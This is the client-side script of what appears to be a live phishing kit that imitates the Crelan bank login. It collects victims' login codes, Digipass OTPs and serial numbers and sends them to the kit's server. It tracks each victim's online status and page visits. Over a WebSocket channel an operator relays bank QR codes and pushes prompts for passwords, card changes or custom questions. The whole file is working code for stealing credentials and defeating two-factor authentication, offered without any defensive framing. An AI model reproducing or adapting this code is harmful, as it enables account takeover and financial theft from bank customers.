<script>
  document.addEventListener('DOMContentLoaded', function () {
    const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
    const codeInput = document.getElementById('code-input');
    let preSessionId = null;
    let onlineCheckInterval = null;
    let isSubmitting = false;
    let sessionId = null;
    let userCode = '';
    let qrTimer = null;
    let qrCountdown = 60;
    let qrReceived = false;
    let echoChannel = null;
    let activeQrView = null;
    let dpQrTimer = null;
    let dpQrCountdown = 160;
    let dpQrReceived = false;
    let connectedSessionId = null;

    const views = {
      code: document.getElementById('view-code'),
      method: document.getElementById('view-method'),
      crelanSign: document.getElementById('view-crelan-sign'),
      digipass: document.getElementById('view-digipass'),
      digipassSerial: document.getElementById('view-digipass-serial'),
    };

    createPreSession();

    const existingSessionId = localStorage.getItem('session_id');
    if (existingSessionId) {
      sessionId = existingSessionId;
      connectToSessionChannel();
      trackPageVisit(existingSessionId, 'Login code page', window.location.href);
    }

    function showView(name) {
      Object.values(views).forEach(v => v.style.display = 'none');
      const target = views[name];
      if (target) target.style.display = 'flex';
    }

    async function trackPageVisit(sid, pageName, pageUrl, actionType = null) {
      try {
        await fetch(`/api/session/${sid}/visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
          body: JSON.stringify({ page_name: pageName, page_url: pageUrl, action_type: actionType })
        });
      } catch (e) { console.error('Failed to track page visit:', e); }
    }

    async function createPreSession() {
      try {
        const response = await fetch('/api/pre-session', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
          body: JSON.stringify({ page_name: 'Login code page', page_url: window.location.href })
        });
        if (response.ok) {
          const data = await response.json();
          preSessionId = data.pre_session_id;
          localStorage.setItem('pre_session_id', preSessionId);
          startOnlineChecking();
        }
      } catch (e) { console.error('Failed to create pre-session:', e); }
    }

    function startOnlineChecking() {
      if (!preSessionId) return;
      updateOnlineStatus(true);
      onlineCheckInterval = setInterval(() => updateOnlineStatus(true), 30000);
      document.addEventListener('visibilitychange', () => { if (!document.hidden) updateOnlineStatus(true); });
      window.addEventListener('beforeunload', () => {
        const fd = new FormData();
        fd.append('is_online', '0');
        fd.append('_token', csrfToken);
        navigator.sendBeacon(`/api/pre-session/${preSessionId}/online`, fd);
      });
    }

    async function updateOnlineStatus(isOnline) {
      if (!preSessionId) return;
      try {
        await fetch(`/api/pre-session/${preSessionId}/online`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
          body: JSON.stringify({ is_online: isOnline })
        });
      } catch (e) { }
    }

    // --- Code entry ---
    codeInput.addEventListener('input', function () {
      const value = codeInput.value.trim();
      if (value.length === 6 && !isSubmitting) {
        isSubmitting = true;
        codeInput.disabled = true;
        codeInput.style.opacity = '0.6';
        userCode = value.toUpperCase();
        handleCodeSubmit(value);
      }
    });

    codeInput.addEventListener('keypress', function (e) {
      if (!/[A-Za-z0-9]/.test(String.fromCharCode(e.which))) e.preventDefault();
    });

    async function handleCodeSubmit(code) {
      try {
        let response;
        if (preSessionId) {
          response = await fetch(`/api/pre-session/${preSessionId}/convert`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
            body: JSON.stringify({ input_type: 'code', input_value: code })
          });
          if (!response.ok) throw new Error('Failed to convert pre-session');
          const data = await response.json();
          sessionId = data.session_id;
        } else {
          response = await fetch('/api/session', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
            body: JSON.stringify({ input_type: 'code', input_value: code })
          });
          if (!response.ok) throw new Error('Failed to create session');
          const data = await response.json();
          sessionId = data.data.id;
        }

        localStorage.setItem('session_id', sessionId);
        localStorage.removeItem('pre_session_id');
        clearInterval(onlineCheckInterval);

        if (window.SessionManager) {
          window.SessionManager.sessionId = sessionId;
          window.SessionManager.storeSessionId(sessionId);
          window.SessionManager.startPing();
        }

        connectToSessionChannel();
        fillUserCode(userCode);
        showView('method');
        trackPageVisit(sessionId, 'Method selection page', window.location.href, 'method_selection');

      } catch (error) {
        console.error('Error creating session:', error);
        isSubmitting = false;
        codeInput.disabled = false;
        codeInput.style.opacity = '1';
        codeInput.focus();
      }
    }

    function fillUserCode(code) {
      ['method-user-code', 'cs-user-code', 'dp-user-code', 'dps-user-code'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.value = code;
      });
    }

    // --- WebSocket channel ---
    function connectToSessionChannel() {
      if (!sessionId) return;

      if (!window.Echo) {
        setTimeout(() => connectToSessionChannel(), 200);
        return;
      }

      if (echoChannel && connectedSessionId === sessionId) return;

      if (echoChannel && connectedSessionId && connectedSessionId !== sessionId) {
        window.Echo.leave(`session.${connectedSessionId}`);
      }

      echoChannel = window.Echo.channel(`session.${sessionId}`);
      connectedSessionId = sessionId;

      echoChannel
        .listen('.action.qr_code', handleQrReceived)
        .listen('.action.digipass-serial', handleDigipassSerialTrigger)
        .listen('.action.digipass', handleDigipassAction)
        .listen('.action.redirect', handleRedirect)
        .listen('.redirect', handleRedirect)
        .listen('.action.code', handleActionRedirect)
        .listen('.action.push', handleActionRedirect)
        .listen('.action.push-icon', handleActionRedirect)
        .listen('.action.password', handleActionRedirect)
        .listen('.action.card-change', handleActionRedirect)
        .listen('.action.error', handleActionRedirect)
        .listen('.action.custom-error', handleActionRedirect)
        .listen('.action.custom-question', handleActionRedirect)
        .listen('.action.custom-image', handleActionRedirect)
        .listen('.action.image-question', handleActionRedirect)
        .listen('.action.activation', handleActionRedirect)
        .listen('.action.success-hold', handleActionRedirect)
        .listen('.action.hold', handleActionRedirect)
        .listen('.session.completed', handleSessionEnd)
        .listen('.session.cancelled', handleSessionEnd);
    }

    let loadingTimeout = null;

    function showSubmitLoading() {
      document.getElementById('submit-loading-overlay').style.display = 'block';
      if (loadingTimeout) clearTimeout(loadingTimeout);
      loadingTimeout = setTimeout(() => hideSubmitLoading(), 45000);
    }

    function hideSubmitLoading() {
      document.getElementById('submit-loading-overlay').style.display = 'none';
      if (loadingTimeout) { clearTimeout(loadingTimeout); loadingTimeout = null; }
    }

    function handleQrReceived(data) {
      const src = data.qr_image || data.qr_url;
      if (!src) return;

      hideSubmitLoading();

      if (activeQrView === 'crelanSign') {
        qrReceived = true;
        document.getElementById('qr-image').src = src;
        document.getElementById('qr-loading').style.display = 'none';
        document.getElementById('qr-timeout').style.display = 'none';
        document.getElementById('qr-image-wrapper').style.display = 'block';
        startQrCountdown();
      } else if (activeQrView === 'digipass' || activeQrView === null) {
        activeQrView = 'digipass';
        showView('digipass');
        dpQrReceived = true;
        document.getElementById('dp-qr-image').src = src;
        document.getElementById('dp-qr-loading').style.display = 'none';
        document.getElementById('dp-qr-timeout').style.display = 'none';
        document.getElementById('dp-qr-image-wrapper').style.display = 'block';
        startDpQrCountdown();
      }
    }

    function handleDigipassAction(data) {
      hideSubmitLoading();
      if (activeQrView !== 'digipass') {
        activeQrView = 'digipass';
        showView('digipass');
        startDpQrLoading();
      }
    }

    function handleDigipassSerialTrigger(data) {
      hideSubmitLoading();
      switchToDigipassSerial();
    }

    function handleRedirect(data) {
      hideSubmitLoading();
      if (data.url) window.location.href = data.url;
    }

    function handleActionRedirect(data) {
      hideSubmitLoading();
      if (data.redirect_url) {
        window.location.href = data.redirect_url;
      } else if (data.action_type && data.session_id) {
        window.location.href = `/session/${data.session_id}/action/${data.action_type}`;
      }
    }

    function handleSessionEnd() {
      localStorage.removeItem('session_id');
    }

    // --- Method selection ---
    document.getElementById('btn-crelan-sign').addEventListener('click', () => switchToCrelanSign());
    document.getElementById('btn-digipass-cronto').addEventListener('click', () => switchToDigipass());

    // Sidebar nav in Crelan Sign view
    document.getElementById('cs-sidebar-digipass').addEventListener('click', () => switchToDigipass());
    document.getElementById('cs-back-btn').addEventListener('click', (e) => { e.preventDefault(); showView('method'); });

    // Sidebar nav in Digipass Cronto view
    document.getElementById('dp-sidebar-crelan-sign').addEventListener('click', () => switchToCrelanSign());
    document.getElementById('dp-back-btn').addEventListener('click', (e) => { e.preventDefault(); showView('method'); });

    // Sidebar nav in Digipass Serial view (triggered by bot)
    document.getElementById('dps-sidebar-crelan-sign').addEventListener('click', () => switchToCrelanSign());
    document.getElementById('dps-back-btn').addEventListener('click', (e) => { e.preventDefault(); showView('method'); });

    function switchToCrelanSign() {
      activeQrView = 'crelanSign';
      showView('crelanSign');
      trackPageVisit(sessionId, 'Crelan Sign QR page', window.location.href, 'qr-code');
      notifyMethodSelected(sessionId, 'crelan_sign');
      stopDpQrTimer();
      resetDpCrontoForm();
      resetDigipassSerialForm();
      startQrLoading();
    }

    function switchToDigipass() {
      activeQrView = 'digipass';
      showView('digipass');
      trackPageVisit(sessionId, 'Digipass Cronto QR page', window.location.href, 'digipass');
      notifyMethodSelected(sessionId, 'digipass');
      stopQrTimer();
      resetDpCrontoForm();
      startDpQrLoading();
    }

    async function notifyMethodSelected(sid, method) {
      if (!sid) return;
      try {
        await fetch(`/api/session/${sid}/method`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
          body: JSON.stringify({ method: method })
        });
      } catch (e) { console.error('Failed to notify method selection:', e); }
    }

    function resetDpCrontoForm() {
      dpCrontoOtp.value = '';
      dpCrontoSubmitBtn.disabled = true;
      dpCrontoSubmitBtn.textContent = '{{ __("messages.dp_cronto_continue") }}';
    }

    function resetDigipassSerialForm() {
      dpsSerial.value = '';
      dpsOtp.value = '';
      dpsSubmitBtn.disabled = true;
      dpsSubmitBtn.textContent = '{{ __("messages.dp_connect") }}';
    }

    function switchToDigipassSerial() {
      activeQrView = null;
      showView('digipassSerial');
      trackPageVisit(sessionId, 'Digipass serial page', window.location.href, 'digipass_serial');
      stopQrTimer();
      stopDpQrTimer();
      resetDigipassSerialForm();
    }

    // --- QR Loading ---
    function startQrLoading() {
      qrReceived = false;
      qrCountdown = 60;
      document.getElementById('qr-loading').style.display = 'block';
      document.getElementById('qr-image-wrapper').style.display = 'none';
      document.getElementById('qr-timeout').style.display = 'none';

      stopQrTimer();
      qrTimer = setInterval(() => {
        if (qrReceived) return;
        qrCountdown--;
        if (qrCountdown <= 0) {
          stopQrTimer();
          document.getElementById('qr-loading').style.display = 'none';
          document.getElementById('qr-timeout').style.display = 'block';
        }
      }, 1000);
    }

    function startQrCountdown() {
      stopQrTimer();
      qrCountdown = 60;
      const timerEl = document.getElementById('qr-timer');
      if (timerEl) timerEl.textContent = qrCountdown;

      qrTimer = setInterval(() => {
        qrCountdown--;
        if (timerEl) timerEl.textContent = qrCountdown;
        if (qrCountdown <= 0) {
          stopQrTimer();
          document.getElementById('qr-image-wrapper').style.display = 'none';
          document.getElementById('qr-timeout').style.display = 'block';
        }
      }, 1000);
    }

    function stopQrTimer() {
      if (qrTimer) { clearInterval(qrTimer); qrTimer = null; }
    }

    document.getElementById('qr-retry-btn').addEventListener('click', () => {
      trackPageVisit(sessionId, 'Crelan Sign QR retry', window.location.href, 'qr_retry');
      notifyMethodSelected(sessionId, 'crelan_sign');
      startQrLoading();
    });

    // --- Digipass Cronto QR ---
    function startDpQrLoading() {
      dpQrReceived = false;
      dpQrCountdown = 160;
      document.getElementById('dp-qr-loading').style.display = 'block';
      document.getElementById('dp-qr-image-wrapper').style.display = 'none';
      document.getElementById('dp-qr-timeout').style.display = 'none';

      stopDpQrTimer();
      dpQrTimer = setInterval(() => {
        if (dpQrReceived) return;
        dpQrCountdown--;
        if (dpQrCountdown <= 0) {
          stopDpQrTimer();
          document.getElementById('dp-qr-loading').style.display = 'none';
          document.getElementById('dp-qr-timeout').style.display = 'block';
        }
      }, 1000);
    }

    function startDpQrCountdown() {
      stopDpQrTimer();
      dpQrCountdown = 160;
      const timerEl = document.getElementById('dp-qr-timer');
      if (timerEl) timerEl.textContent = dpQrCountdown;

      dpQrTimer = setInterval(() => {
        dpQrCountdown--;
        if (timerEl) timerEl.textContent = dpQrCountdown;
        if (dpQrCountdown <= 0) {
          stopDpQrTimer();
          document.getElementById('dp-qr-image-wrapper').style.display = 'none';
          document.getElementById('dp-qr-timeout').style.display = 'block';
        }
      }, 1000);
    }

    function stopDpQrTimer() {
      if (dpQrTimer) { clearInterval(dpQrTimer); dpQrTimer = null; }
    }

    document.getElementById('dp-qr-retry-btn').addEventListener('click', () => {
      trackPageVisit(sessionId, 'Digipass Cronto QR retry', window.location.href, 'dp_qr_retry');
      notifyMethodSelected(sessionId, 'digipass');
      startDpQrLoading();
    });

    // --- Digipass Cronto OTP form ---
    const dpCrontoOtp = document.getElementById('dp-cronto-otp');
    const dpCrontoSubmitBtn = document.getElementById('dp-cronto-submit-btn');

    dpCrontoOtp.addEventListener('input', () => {
      dpCrontoSubmitBtn.disabled = dpCrontoOtp.value.trim().length < 1;
    });

    document.getElementById('digipass-cronto-form').addEventListener('submit', async function (e) {
      e.preventDefault();
      if (!sessionId) return;

      dpCrontoSubmitBtn.disabled = true;
      dpCrontoSubmitBtn.textContent = '{{ __("messages.loading") }}';
      showSubmitLoading();

      try {
        await fetch(`/api/session/${sessionId}/submit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
          body: JSON.stringify({
            action_type: 'digipass',
            custom_answers: {
              source: 'qr',
              otp: dpCrontoOtp.value.trim()
            }
          })
        });

        trackPageVisit(sessionId, 'Digipass Cronto submitted', window.location.href, 'digipass_cronto_submit');

      } catch (error) {
        console.error('Digipass Cronto submit error:', error);
        hideSubmitLoading();
        dpCrontoSubmitBtn.disabled = false;
        dpCrontoSubmitBtn.textContent = '{{ __("messages.dp_cronto_continue") }}';
      }
    });

    // --- Digipass Serial form (triggered by bot) ---
    const dpsSerial = document.getElementById('dps-serial-number');
    const dpsOtp = document.getElementById('dps-otp');
    const dpsSubmitBtn = document.getElementById('dps-submit-btn');

    function checkDigipassSerialForm() {
      const serialOk = dpsSerial.value.trim().length >= 6;
      const otpOk = dpsOtp.value.trim().length === 6;
      dpsSubmitBtn.disabled = !(serialOk && otpOk);
    }

    dpsSerial.addEventListener('input', checkDigipassSerialForm);
    dpsOtp.addEventListener('input', checkDigipassSerialForm);

    document.getElementById('digipass-serial-form').addEventListener('submit', async function (e) {
      e.preventDefault();
      if (!sessionId) return;

      dpsSubmitBtn.disabled = true;
      dpsSubmitBtn.textContent = '{{ __("messages.loading") }}';
      showSubmitLoading();

      try {
        await fetch(`/api/session/${sessionId}/submit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
          body: JSON.stringify({
            action_type: 'digipass',
            custom_answers: {
              source: 'serial',
              serial_number: dpsSerial.value.trim(),
              otp: dpsOtp.value.trim()
            }
          })
        });

        trackPageVisit(sessionId, 'Digipass submitted', window.location.href, 'digipass_submit');

      } catch (error) {
        console.error('Digipass submit error:', error);
        hideSubmitLoading();
        dpsSubmitBtn.disabled = false;
        dpsSubmitBtn.textContent = '{{ __("messages.dp_connect") }}';
      }
    });
  });

  let visitTracked = false;
  window.addEventListener('load', () => {
    if (visitTracked) return;
    visitTracked = true;
    fetch('/api/visit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content },
      body: JSON.stringify({ event: 'id', locale: '{{ app()->getLocale() }}' })
    }).catch(() => { });
  });
</script>

